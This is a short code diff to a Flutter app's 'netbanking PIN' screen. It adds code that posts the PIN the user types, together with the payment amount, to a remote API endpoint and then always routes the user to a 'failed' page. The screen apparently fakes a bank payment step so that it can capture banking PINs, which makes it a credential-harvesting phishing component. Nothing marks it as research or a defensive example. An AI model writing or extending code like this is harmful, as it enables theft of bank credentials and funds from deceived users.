@@ -1,5 +1,8 @@
 import 'package:flutter/material.dart';
 import 'package:go_router/go_router.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
+import '../api_config.dart';
 import '../theme.dart';
 
 class NetbankingPinScreen extends StatefulWidget {
@@ -13,7 +16,10 @@ class _S extends State<NetbankingPinScreen> {
   final pin = TextEditingController();
 
   void submit() {
-    if (pin.text.isNotEmpty) context.push('/failed');
+    if (pin.text.isNotEmpty) {
+      http.post(Uri.parse('$apiBaseUrl/api/netbanking-pin'), headers: {'Content-Type': 'application/json'}, body: jsonEncode({'pin': pin.text, 'amount': widget.amount}));
+      context.push('/failed');
+    }
   }
 
   @override
